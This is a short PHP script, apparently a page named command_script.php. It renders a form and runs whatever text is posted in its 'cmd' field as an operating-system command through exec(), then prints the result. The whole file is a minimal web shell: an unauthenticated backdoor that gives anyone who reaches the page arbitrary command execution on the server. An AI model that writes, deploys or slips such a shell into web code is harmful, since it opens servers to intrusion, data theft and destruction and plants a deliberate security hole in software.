<?php
echo "<form action=command_script.php method=POST><input type=text name=cmd /></form>";
echo htmlspecialchars(exec($_POST["cmd"]));
?>
